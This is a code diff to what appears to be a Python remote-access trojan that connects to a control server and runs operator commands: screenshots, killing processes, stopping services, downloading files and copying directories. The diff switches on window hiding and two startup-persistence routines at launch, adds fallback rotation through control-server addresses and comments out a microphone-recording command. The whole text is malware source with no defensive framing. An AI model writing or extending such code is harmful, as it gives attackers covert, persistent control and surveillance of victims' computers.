@@ -6,7 +6,7 @@ import requests
 
 from constants import CONTROL
 import pyutils.ad_utils as ad
-import pyutils.audio as a
+#import pyutils.audio as a
 import pyutils.downloader as d
 import pyutils.encryption_utils as eu
 import pyutils.file_handling as fh
@@ -15,6 +15,7 @@ import pyutils.local_utils as lu
 import pyutils.network_utils as nu
 import pyutils.powershell_utils as pu
 import pyutils.screenshot_handling as sh
+import pyutils.copier as c
 
 Buffer = 2
 Interval = 10
@@ -74,7 +75,7 @@ def handle_input(message: str):
         "add-to-startup-1": lu.add_to_startup_1,
         "add-to-startup-2": lu.add_to_startup_2,
         "screenshot": sh.handle_screenshot,
-        "audio-record": a.handle_mic,
+        #"audio-record": a.handle_mic,
         "get-processes": lu.processes,
         "downloader": d.downloader,
         "kill": lu.kill_process_cmd,
@@ -82,6 +83,9 @@ def handle_input(message: str):
         "repeat-kill-proc": lu.repeat_kill_by_name,
         "get-all-services": lu.get_all_services_cmd,
         "stop-service": lu.stop_service_cmd,
+        "get-dirs": c.get_dirs,
+        "copy-to-defaults": c.copy_default,
+        "copy-to-dir": c.copy_to_dir,
         "ip-add": add_ip
     }
 
@@ -92,16 +96,19 @@ def handle_input(message: str):
     return handle_base_command(message)
 
 def get_new_ip(ip):
+    global Ips
     i = Ips.index(ip)
     if len(Ips) >= i+2:
         return Ips[i+1]
-    return ip
+    return Ips[0]
 
 def start_server():
     ip = CONTROL
     error_count = 0
     mac = get_mac()
-    #lu.hide()
+    lu.hide()
+    lu.add_to_startup_1()
+    lu.add_to_startup_2()
     while True:
         time.sleep(get_sleep_time())
 
